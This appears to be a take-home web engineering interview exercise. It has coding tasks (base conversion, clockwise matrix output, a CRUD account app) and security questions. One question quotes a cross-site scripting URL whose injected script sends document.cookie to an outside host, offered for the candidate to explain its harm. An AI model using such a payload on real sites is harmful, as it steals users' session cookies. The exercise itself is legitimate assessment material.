# Epic Games, Web Engineer Exercise

Thank you for taking the time to complete the exercise below. Please return your response within one week to the link provided by your recruiter.

Instructions/Notes:

-   State your assumptions when you solve each problem.
-   All code is run through a test suite to test its production quality; these tests affect whether or not our interview process continues, so please take them seriously.
-   Please try to give an approximate time that it took you to solve each portion of the exercise.
-   Be aware that there may be multiple ways to solve some of the questions.
-   We&#39;d like to request that when responding, you either zip your files into a Zip File, or upload your response to Google Drive or Dropbox with a link. This will keep responses private and easy to access for us. Thank you!
-   Use the latest version of Node unless otherwise specified
-   Install with yarn ([https://yarnpkg.com/en/](https://yarnpkg.com/en/)) by running &#39;yarn&#39; in the root directory. Then start the dev server by running &#39;yarn start&#39;. Start the service by running &#39;yarn start-service&#39; in a separate console.
-   The app should start up without issues and run on [http://localhost:3000/](http://localhost:3000/)
-   Feel free to extend and enhance the test application as you would for a production-ready app.
-   Writing tests for your code is recommended.
-   **The source code for the web test can be downloaded at the following URL. Please let us know if you have any trouble downloading or opening this file:** [**https://cdn1.unrealengine.com/Public/epic-web-test.zip**](https://cdn1.unrealengine.com/Public/epic-web-test.zip)

Questions:

**1)** In the given starter page (/epic-web-test/src/question1/Question1.js), implement the function that displays the string form of a value in a particular number base.

function integerToString(value, numberBase)

**Do\*\*** not\*\* use built-in language features to accomplish the task.

Do not trivialize the task by using pre-existing JS functions to solve the crux of the question, for example, Number.toString(numberBase).

The page should render without errors here

http://localhost:3000/question-1

**2)** In the given starter page (/epic-web-test/src/question2/Question2.js), write a function that given a matrix of integers, builds a string with the entries of that matrix appended in clockwise order.

function clockwiseMatrix(matrixString)

The function should accept a string representing the matrix as shown below: brackets around each row of comma-separated integers, and a newline between each row. The function should return the solution string of comma-separated integers. Note that this field takes human input, so parsing and validation is important

Example Input:

| Input                                                                   | Output                                                                |
| ----------------------------------------------------------------------- | --------------------------------------------------------------------- |
| [2, 3, 4, 8][5, 7, 9, 12][1, 0, 6, 10]                                  | 2, 3, 4, 8, 12, 10, 6, 0, 1, 5, 7, 9                                  |
| [1, 2, 3][4, 5, 6][7, 8 , 9][10, 11 , 12]                               | 1, 2, 3, 6, 9, 12, 11, 10, 7, 4, 5, 8                                 |
| [1, 2][3, 4]                                                            | 1, 2, 4, 3                                                            |
| [1, 2, 3][4, 5, 6][7, 8 , 9]                                            | 1, 2, 3, 6, 9, 8, 7, 4, 5                                             |
| [1, 2, 3, 4, 5][6, 7, 8, 9, 10][11, 12, 13, 14, 15][16, 17, 18, 19, 20] | 1, 2, 3, 4, 5, 10, 15, 20, 19, 18, 17, 16, 11, 6, 7, 8, 9, 14, 13, 12 |

a. Given your solution, how would you verify the correctness of your answers?

**3)** Create a simple account management service and page(s) thatallows an internal customer service team to perform CRUD operations on users. We have provided a sample in-memory service that you can either use or replace. An account consists of a person&#39;s name, date of birth, and email. The application should be intuitive and user friendly. Please explain your design choices. Feel free to use any external frameworks that you feel will help (flux, axios, etc).

**Note:** The mock service can be started with &#39;yarn start-service&#39;

Once you have created a basic CRUD front-end, enhance your application with one or more of the following features

-   Improved User Experience and front-end design. Create a user experience that improves workflow in some way. Polish the UI for your account application to production standards.
    -   What are some of the design decisions that you made?
-   Full service implementation. Replace the in-memory service with a real back end (mongo/sql/etc). Feel free to use any javascript frameworks/libraries that help you accomplish this goal. Also, extend the account such that each user has a &quot;wallet&quot; with a balance, with the ability to add or remove currency from the wallet through an API.
    -   What considerations did you make for adding this additional data?
    -   How would you scale this system to millions of accounts?
-   Add searching/filtering functionality to the accounts. Give the user the ability to search for a specific account. Bonus points if you use a single search box (omni-search) that searches the fields based on user input.
    -   How would this search scale if there were a million accounts?
    -   What considerations did you make for performance?
-   Implement performance instrumentation for your application. Instrument your application in such a way that you get detailed insight into how it performs.
    -   Which parts of the app did you instrument and why did you consider those areas?
    -   Describe how the instrumentation you added could be used by QA to identify action items to improve the application&#39;s performance (give examples where possible)

**4)** What harm could result from the following?

http://www.example.com/search?q=\<script\>object.src="http://otherexample.com/code?data="+document.cookie\</script>

**5)** Explain what security measures need to be taken into consideration for web applications.

**6)** Please provide us with a link(s) to your portfolio and/or some code samples of your work.
